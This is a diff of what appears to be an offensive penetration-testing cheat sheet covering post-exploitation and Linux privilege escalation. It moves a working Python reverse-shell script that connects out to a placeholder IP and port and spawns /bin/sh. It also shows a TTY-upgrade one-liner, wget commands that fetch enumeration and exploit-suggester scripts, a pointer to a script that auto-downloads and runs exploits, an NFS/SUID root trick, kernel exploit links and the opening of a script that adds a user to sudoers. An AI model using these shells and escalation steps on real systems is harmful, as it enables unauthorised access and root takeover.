@@ -18,6 +18,16 @@ Getting a reverse shell
 Post exploitation
     Get a TTY shell after a reverse shell connection
     *$ python -c 'import pty;pty.spawn("/bin/bash")'*
+    Reverse shell with python script:
+    *#!/usr/bin/python
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("IP",port))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])*
+
 
 
 Escaping limited interpreters
@@ -69,14 +79,16 @@ Linux elevation of privileges
 
     If /etc/exports if writable, you can add an NFS entry to a root directory, put a binary with SUID bit on, and get root
 
-    Scripts to run
+Scripts to run
+    The following script runs exploit suggester and automatically downloads and executes suggested exploits:
+    *https://raw.githubusercontent.com/codingo/OSCP-1/master/xploitdeli.py*
+    Other scripts:
     *wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
 wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
 wget https://raw.githubusercontent.com/PenturaLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl*
 
-    The following script runs exploit suggester and automatically downloads and executes suggested exploits:
-    *https://raw.githubusercontent.com/codingo/OSCP-1/master/xploitdeli.py*
+
 Exploits worth running
     CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8
     *https://www.exploit-db.com/exploits/15285/*
@@ -92,6 +104,7 @@ Exploits worth running
     *https://dirtycow.ninja/*
 
 
+Manual testing
 
     Command to skip ignored lines in config files
     *$ alias nonempty="egrep -v '^[ \t]*#|^$'"*
@@ -180,16 +193,6 @@ system("/bin/bash");
     *$ find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print*
     Find nobody owned files
     *$ find /dir -xdev \( -nouser -o -nogroup \) -print*
-
-    Reverse shell with python script:
-    *#!/usr/bin/python
-import socket,subprocess,os
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("IP",port))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-p=subprocess.call(["/bin/sh","-i"])*
 
     Add user to sudoers in python.
     *#!/usr/bin/env python
